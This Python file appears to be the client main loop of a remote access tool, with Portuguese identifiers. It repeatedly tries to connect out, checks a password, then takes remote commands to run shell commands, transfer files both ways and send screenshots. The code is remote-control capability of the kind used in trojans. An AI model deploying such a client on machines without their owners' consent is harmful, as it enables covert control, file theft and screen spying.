from Client.procurar_conexao import procurar_conexao
from Client.BETA.enviar_captura_tela import enviar_captura_tela
from Client.executar_cmd import executar_cmd
from Client.transferir_receber_arquivos import enviar_arquivo, receber_arquivo
import time
from os import getenv
from dotenv import load_dotenv

def main():
    load_dotenv()
    senha_acesso = str(getenv('SENHA_DE_ACESSO'))

    while True:
        try:
            while True:
                conn = procurar_conexao()
                if not conn:
                    while True:
                        time.sleep(5)
                        conn = procurar_conexao()
                        if conn:
                            break

                tentativas = 0
                while True:
                    senha_recebida = conn.recv(1024).decode()
                    if senha_recebida == senha_acesso:
                        conn.send(b'0')
                        break
                    else:       
                        tentativas += 1
                        if tentativas == 3:
                            conn.send(b'2')
                            break
                        conn.send(b'1')
                              
                while True:
                    selecao = conn.recv(1024).decode()
                    if selecao.lower() == 'sair' or selecao == '':
                        conn.close()
                        break
                
                    elif selecao == '1':
                        executar_cmd(conn)

                    elif selecao == '2':
                        receber_arquivo(conn)

                    elif selecao == '3':
                        enviar_arquivo(conn)

                    elif selecao == '4':
                        enviar_captura_tela(conn)
                    
                    else:
                        pass

        except (ConnectionRefusedError, ConnectionAbortedError, ConnectionResetError, BrokenPipeError):
            pass
if __name__ == "__main__":
     main()
